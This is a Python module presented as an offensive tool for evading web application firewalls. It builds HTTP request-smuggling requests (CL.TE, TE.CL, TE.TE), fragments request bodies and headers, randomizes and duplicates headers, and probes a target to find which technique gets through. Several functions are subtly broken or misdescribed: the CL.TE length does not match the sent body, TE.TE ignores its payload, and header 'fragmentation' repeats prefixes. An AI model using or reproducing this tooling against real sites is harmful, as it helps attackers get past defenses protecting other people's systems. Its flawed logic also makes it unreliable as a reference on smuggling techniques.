"""HTTP request smuggling and fragmentation for protocol-level evasion.

This module provides HTTP request smuggling, fragmentation techniques,
and protocol mutation to bypass WAFs at the protocol level.
"""

from __future__ import annotations

import random
from dataclasses import dataclass
from typing import Any


@dataclass
class SmugglingTechnique:
    """Represents an HTTP request smuggling technique."""

    name: str
    description: str
    content_length: int | None = None
    transfer_encoding: str | None = None
    chunk_size: int = 0


class RequestSmuggler:
    """HTTP request smuggling implementation.

    Implements CL.TE, TE.CL, and TE.TE smuggling techniques
    to bypass WAFs that parse HTTP requests differently than
    the backend server.
    """

    def __init__(self) -> None:
        self._techniques = {
            "cl_te": SmugglingTechnique(
                "CL.TE",
                "Content-Length vs Transfer-Encoding (WAF uses CL, backend uses TE)",
            ),
            "te_cl": SmugglingTechnique(
                "TE.CL",
                "Transfer-Encoding vs Content-Length (WAF uses TE, backend uses CL)",
            ),
            "te_te": SmugglingTechnique(
                "TE.TE",
                "Transfer-Encoding obfuscation (different TE interpretations)",
            ),
        }

    def apply_cl_te_smuggling(self, request: str, payload: str, chunk_size: int = 10) -> str:
        """Apply CL.TE smuggling technique.

        WAF sees Content-Length, backend sees Transfer-Encoding.
        """
        # Calculate content length for WAF
        body = f"0\r\n\r\n{payload}"
        content_length = len(body)

        # Create request with both headers
        smuggled = (
            f"{request}\r\n"
            f"Content-Length: {content_length}\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"{chunk_size:X}\r\n"
            f"{payload[:chunk_size]}\r\n"
            f"0\r\n\r\n"
        )

        return smuggled

    def apply_te_cl_smuggling(self, request: str, payload: str) -> str:
        """Apply TE.CL smuggling technique.

        WAF sees Transfer-Encoding, backend sees Content-Length.
        """
        # Obfuscate Transfer-Encoding for WAF
        obfuscated_te = "Transfer\x00-Encoding: chunked"

        # Calculate content length for backend
        body = f"{payload}"
        content_length = len(body)

        smuggled = f"{request}\r\n{obfuscated_te}\r\nContent-Length: {content_length}\r\n\r\n{body}"

        return smuggled

    def apply_te_te_smuggling(self, request: str, payload: str) -> str:
        """Apply TE.TE smuggling technique.

        Obfuscate Transfer-Encoding in different ways for WAF vs backend.
        """
        # Use different TE obfuscation
        te_waf = "Transfer-Encoding: chunked"
        te_backend = "Transfer\x00-Encoding: chunked"

        smuggled = f"{request}\r\n{te_waf}\r\n{te_backend}\r\n\r\n5\r\nhello\r\n0\r\n\r\n"

        return smuggled

    def generate_smuggled_request(
        self, request: str, payload: str, technique: str = "cl_te"
    ) -> str:
        """Generate smuggled request using specified technique."""
        technique = technique.lower().replace("-", "_")

        if technique == "cl_te":
            return self.apply_cl_te_smuggling(request, payload)
        elif technique == "te_cl":
            return self.apply_te_cl_smuggling(request, payload)
        elif technique == "te_te":
            return self.apply_te_te_smuggling(request, payload)
        else:
            # Default to CL.TE
            return self.apply_cl_te_smuggling(request, payload)

    def obfuscate_header(self, header_name: str, header_value: str) -> str:
        """Obfuscate HTTP header to evade detection."""
        obfuscation_methods = [
            lambda n, v: f"{n}: {v}",  # No obfuscation
            lambda n, v: f"{n}:  {v}",  # Extra space
            lambda n, v: f"{n}:\t{v}",  # Tab
            lambda n, v: f"{n}: {v} ",  # Trailing space
            lambda n, v: f"{n}:\r\n {v}",  # CRLF space
        ]

        method = random.choice(obfuscation_methods)
        return method(header_name, header_value)


class RequestFragmenter:
    """Fragment HTTP requests to bypass WAF inspection.

    Splits requests into chunks using various fragmentation
    techniques to evade WAFs that only inspect the first part.
    """

    def __init__(self) -> None:
        self._fragmentation_methods = [
            "chunked",
            "multipart",
            "header_fragmentation",
            "body_fragmentation",
        ]

    def fragment_chunked(self, request: str, body: str, chunk_size: int = 100) -> list[str]:
        """Fragment request using chunked transfer encoding."""
        fragments = []
        headers = request.split("\r\n\r\n")[0]

        # Chunk the body
        for i in range(0, len(body), chunk_size):
            chunk = body[i : i + chunk_size]
            chunk_hex = f"{len(chunk):X}"
            fragment = f"{headers}\r\n\r\n{chunk_hex}\r\n{chunk}\r\n"
            fragments.append(fragment)

        # Add final chunk
        fragments.append(f"{headers}\r\n\r\n0\r\n\r\n")

        return fragments

    def fragment_multipart(self, request: str, body: str, part_count: int = 3) -> list[str]:
        """Fragment request using multipart encoding."""
        fragments = []
        headers = request.split("\r\n\r\n")[0]

        # Split body into parts
        body_length = len(body)
        part_size = body_length // part_count

        for i in range(part_count):
            start = i * part_size
            end = start + part_size if i < part_count - 1 else body_length
            part = body[start:end]

            # Add multipart boundary
            boundary = f"----Part{i + 1}"
            fragment = (
                f"{headers}\r\n"
                f"Content-Type: multipart/mixed; boundary={boundary}\r\n"
                f"\r\n"
                f"--{boundary}\r\n"
                f"{part}\r\n"
                f"--{boundary}--\r\n"
            )
            fragments.append(fragment)

        return fragments

    def fragment_headers(self, request: str) -> list[str]:
        """Fragment request by splitting headers."""
        lines = request.split("\r\n")
        fragments = []

        # Split headers into multiple requests
        for i in range(0, len(lines), 5):
            fragment_lines = lines[: i + 5]
            fragment = "\r\n".join(fragment_lines)
            fragments.append(fragment)

        return fragments

    def fragment_body(self, request: str, body: str, fragment_count: int = 2) -> list[str]:
        """Fragment request body into multiple requests."""
        headers = request.split("\r\n\r\n")[0]
        fragments = []

        body_length = len(body)
        fragment_size = body_length // fragment_count

        for i in range(fragment_count):
            start = i * fragment_size
            end = start + fragment_size if i < fragment_count - 1 else body_length
            fragment_body = body[start:end]

            fragment = f"{headers}\r\n\r\n{fragment_body}"
            fragments.append(fragment)

        return fragments

    def fragment_request(self, request: str, body: str, method: str = "chunked") -> list[str]:
        """Fragment request using specified method."""
        method = method.lower()

        if method == "chunked":
            return self.fragment_chunked(request, body)
        elif method == "multipart":
            return self.fragment_multipart(request, body)
        elif method == "header_fragmentation":
            return self.fragment_headers(request)
        elif method == "body_fragmentation":
            return self.fragment_body(request, body)
        else:
            return self.fragment_chunked(request, body)


class ProtocolMutator:
    """Mutate HTTP protocol elements to evade detection.

    Mutates HTTP methods, versions, header ordering, and other
    protocol elements to bypass signature-based WAFs.
    """

    def __init__(self) -> None:
        self._http_methods = ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"]
        self._http_versions = ["HTTP/1.0", "HTTP/1.1", "HTTP/2"]

    def mutate_method(self, request: str, new_method: str | None = None) -> str:
        """Mutate HTTP method."""
        if new_method is None:
            new_method = random.choice(self._http_methods)

        lines = request.split("\r\n")
        if lines:
            # Replace first line method
            first_line = lines[0]
            parts = first_line.split(" ")
            if parts:
                parts[0] = new_method
                lines[0] = " ".join(parts)

        return "\r\n".join(lines)

    def mutate_version(self, request: str, new_version: str | None = None) -> str:
        """Mutate HTTP version."""
        if new_version is None:
            new_version = random.choice(self._http_versions)

        lines = request.split("\r\n")
        if lines:
            first_line = lines[0]
            parts = first_line.split(" ")
            if len(parts) >= 3:
                parts[2] = new_version
                lines[0] = " ".join(parts)

        return "\r\n".join(lines)

    def mutate_header_order(self, request: str) -> str:
        """Randomize header order."""
        lines = request.split("\r\n")
        if len(lines) < 3:
            return request

        # Extract headers (between first line and empty line)
        first_line = lines[0]
        headers = []
        body_start = 1

        for i, line in enumerate(lines[1:], 1):
            if line == "":
                body_start = i + 1
                break
            if ":" in line:
                headers.append(line)

        # Shuffle headers
        random.shuffle(headers)

        # Reconstruct request
        new_lines = [first_line] + headers + [""] + lines[body_start:]
        return "\r\n".join(new_lines)

    def mutate_header_casing(self, request: str) -> str:
        """Randomize header name casing."""
        lines = request.split("\r\n")

        for i, line in enumerate(lines):
            if ":" in line:
                header_name, _, value = line.partition(":")
                # Randomize casing
                new_name = "".join(
                    c.upper() if random.random() < 0.5 else c.lower() for c in header_name
                )
                lines[i] = f"{new_name}:{value}"

        return "\r\n".join(lines)

    def add_duplicate_headers(self, request: str) -> str:
        """Add duplicate headers (some WAFs miss duplicates)."""
        lines = request.split("\r\n")

        # Find a header to duplicate
        for i, line in enumerate(lines):
            if ":" in line and line.lower().startswith(("user-agent", "accept")):
                # Insert duplicate after original
                lines.insert(i + 1, line)
                break

        return "\r\n".join(lines)

    def mutate_protocol(self, request: str, mutations: list[str] | None = None) -> str:
        """Apply protocol mutations."""
        if mutations is None:
            mutations = ["method", "version", "header_order", "header_casing"]

        result = request

        for mutation in mutations:
            if mutation == "method":
                result = self.mutate_method(result)
            elif mutation == "version":
                result = self.mutate_version(result)
            elif mutation == "header_order":
                result = self.mutate_header_order(result)
            elif mutation == "header_casing":
                result = self.mutate_header_casing(result)
            elif mutation == "duplicate_headers":
                result = self.add_duplicate_headers(result)

        return result


class SmugglingDetector:
    """Detect WAF handling of smuggling attempts.

    Tests different smuggling techniques to identify which
    technique works against a specific WAF.
    """

    def __init__(self) -> None:
        self._smuggler = RequestSmuggler()
        self._fragmenter = RequestFragmenter()
        self._effective_techniques: list[str] = []

    def test_smuggling_technique(
        self, session: Any, request: str, payload: str, technique: str
    ) -> bool:
        """Test a specific smuggling technique."""
        smuggled = self._smuggler.generate_smuggled_request(request, payload, technique)
        runtime = getattr(session, "runtime", {}) if session is not None else {}
        probe = runtime.get("smuggling_probe") if isinstance(runtime, dict) else None
        if callable(probe):
            result = probe(
                {
                    "request": smuggled,
                    "payload": payload,
                    "technique": technique,
                }
            )
            if isinstance(result, dict):
                return bool(result.get("effective") or result.get("success"))
            return bool(result)
        return False

    def detect_effective_technique(self, session: Any, request: str, payload: str) -> str:
        """Detect which smuggling technique is effective."""
        techniques = ["cl_te", "te_cl", "te_te"]

        for technique in techniques:
            if self.test_smuggling_technique(session, request, payload, technique):
                self._effective_techniques.append(technique)

        # Return the first effective technique
        if self._effective_techniques:
            return self._effective_techniques[0]

        return "cl_te"  # Default fallback

    def get_fallback_request(self, request: str) -> str:
        """Get fallback standard request if smuggling fails."""
        # Return standard request without smuggling
        return request


def apply_request_smuggling(request: str, payload: str, technique: str = "cl_te") -> str:
    """Apply HTTP request smuggling to evade WAF."""
    smuggler = RequestSmuggler()
    return smuggler.generate_smuggled_request(request, payload, technique)


def fragment_request(request: str, body: str, method: str = "chunked") -> list[str]:
    """Fragment HTTP request to evade WAF inspection."""
    fragmenter = RequestFragmenter()
    return fragmenter.fragment_request(request, body, method)


def mutate_http_protocol(request: str, mutations: list[str] | None = None) -> str:
    """Mutate HTTP protocol elements to evade detection."""
    mutator = ProtocolMutator()
    return mutator.mutate_protocol(request, mutations)
